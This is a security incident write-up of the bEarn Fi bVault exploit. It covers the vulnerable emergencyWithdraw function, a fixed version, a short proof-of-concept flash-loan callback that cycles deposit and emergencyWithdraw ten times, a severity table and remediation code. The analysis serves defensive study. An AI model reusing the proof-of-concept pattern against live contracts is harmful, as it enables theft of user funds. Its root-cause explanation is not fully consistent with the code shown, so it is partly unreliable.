## 1. Vulnerability Overview

bEarn Fi's bVault manages BUSD using an Alpaca Finance strategy. By borrowing all available BUSD via a flash loan from CreamFi, then repeatedly cycling through deposit into bVault pool 13 followed by an immediate emergencyWithdraw — 10 times in total — the vault's internal accounting (share calculation) becomes corrupted, allowing withdrawal of more BUSD than was actually deposited.

## 2. Vulnerable Code Analysis

### 2.1 emergencyWithdraw() — Share Recalculation Error on Repeated Calls

```solidity
// ❌ bVault — accounting inconsistency on repeated emergencyWithdraw calls
// CreamFi @ 0x2Bc4eb013DDee29D37920938B96d353171289B7C
// bVault @ 0xB390B07fcF76678089cb12d8E615d5Fe494b01Fb

function emergencyWithdraw(uint256 _pid) external {
    PoolInfo storage pool = poolInfo[_pid];
    UserInfo storage user = userInfo[_pid][msg.sender];

    uint256 amount = user.amount;
    user.amount = 0;
    user.rewardDebt = 0;

    // Transfers actual tokens without decrementing totalStaked
    // On repeated calls, the same amount can be withdrawn multiple times
    pool.lpToken.safeTransfer(address(msg.sender), amount);
    emit EmergencyWithdraw(msg.sender, _pid, amount);
}
```

**Fixed Code**:
```solidity
// ✅ Immediately update pool totalStaked after emergencyWithdraw
function emergencyWithdraw(uint256 _pid) external nonReentrant {
    PoolInfo storage pool = poolInfo[_pid];
    UserInfo storage user = userInfo[_pid][msg.sender];

    uint256 amount = user.amount;
    // Clear state first (CEI)
    user.amount = 0;
    user.rewardDebt = 0;
    pool.totalStaked -= amount; // also update totalStaked

    // Transfer last
    pool.lpToken.safeTransfer(address(msg.sender), amount);
    emit EmergencyWithdraw(msg.sender, _pid, amount);
}
```

## 4. PoC Code (DeFiHackLabs)

```solidity
// 10-cycle loop inside CreamFi flash loan callback
function flashCallback(address token, uint256 amount) external {
    // Repeat deposit → emergencyWithdraw 10 times
    for (uint i = 0; i < 10; i++) {
        // Deposit BUSD into bVault pool 13
        bVault.deposit(13, BUSD.balanceOf(address(this)));
        // Immediately emergency withdraw — accounting errors accumulate
        bVault.emergencyWithdraw(13);
    }

    // Repay flash loan to CreamFi
    uint256 repayAmount = amount + fee;
    BUSD.transfer(address(CreamFi), repayAmount);
    // Transfer surplus BUSD to attacker wallet
}
```

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | Missing `totalStaked` update on repeated `emergencyWithdraw()` calls — even after `user.amount` is zeroed, re-deposit/re-withdraw cycles allow internal accounting inconsistency and duplicate withdrawals | CRITICAL | CWE-841 |
| V-02 | Repeated deposit-emergencyWithdraw within the same block is permitted (contributing factor: flash loan used to source funds) | MEDIUM | CWE-20 |

> **Root Cause**: `emergencyWithdraw()` zeroes `user.amount` but does not decrement `totalStaked`, making it possible to over-withdraw on each re-deposit/re-withdraw cycle. The flash loan is merely a means to obtain large capital; the attack is also feasible at smaller scale with the attacker's own funds.

---
## 6. Remediation Recommendations

```solidity
// ✅ Enforce minimum block delay between deposit and withdraw
// ✅ Apply nonReentrant to emergencyWithdraw + strictly follow CEI pattern

mapping(address => mapping(uint256 => uint256)) public lastDepositBlock;

function deposit(uint256 _pid, uint256 _amount) external nonReentrant {
    lastDepositBlock[msg.sender][_pid] = block.number;
    // ... deposit logic
}

function emergencyWithdraw(uint256 _pid) external nonReentrant {
    require(
        block.number > lastDepositBlock[msg.sender][_pid],
        "bVault: same block deposit-withdraw"
    );
    // ... withdraw following CEI pattern
}
```

## 7. Lessons Learned

- **The core bug in `emergencyWithdraw` is the missing `totalStaked` update.** This is the root cause; fixing it makes the attack impossible even without a flash loan.
- **The flash loan is a means to extract greater profit in a single transaction, not the vulnerability itself.** Blocking same-block deposit-withdraw is a supplementary defense.
- **`emergencyWithdraw` requires stricter state synchronization than a normal withdraw.** The CEI pattern and decrementing `totalStaked` are both mandatory.
